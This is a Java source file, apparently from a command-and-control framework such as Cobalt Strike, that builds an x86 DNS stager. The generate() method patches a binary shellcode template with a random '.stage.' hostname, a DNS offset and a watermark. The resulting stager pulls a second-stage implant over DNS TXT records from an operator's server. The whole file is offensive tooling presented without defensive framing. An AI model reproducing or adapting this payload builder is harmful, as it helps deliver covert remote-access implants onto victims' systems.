package stagers;

import common.CommonUtils;
import common.Listener;
import common.Packer;

public abstract class GenericDNSStagerX86
        extends GenericStager {
    public GenericDNSStagerX86(Listener l) {
        super(l);
    }

    @Override
    public String arch() {
        return "x86";
    }

    public abstract String getDNSHost();

    public String getHost() {
        long nonce = CommonUtils.rand(16777215);
        return ".stage." + nonce + "." + this.getDNSHost();
    }

    @Override
    public byte[] generate() {
        String data = CommonUtils.bString(CommonUtils.readResource("resources/dnsstager.bin"));
        String host = this.getConfig().pad(this.getHost() + '\u0000', 60);
        if (host.length() > 60) {
            CommonUtils.print_error("DNS Staging Host '" + host + "' is too long! (DNS TXT record stager will crash!)");
        }
        int i = data.indexOf(".ABCDEFGHIJKLMNOPQRSTUVWXYZXXXX");
        data = CommonUtils.replaceAt(data, host, i);
        Packer packer = new Packer();
        packer.little();
        packer.addInt(this.getConfig().getDNSOffset());
        data = CommonUtils.replaceAt(data, CommonUtils.bString(packer.getBytes()), 509) + this.getConfig().getWatermark();
        return CommonUtils.toBytes(data);
    }
}

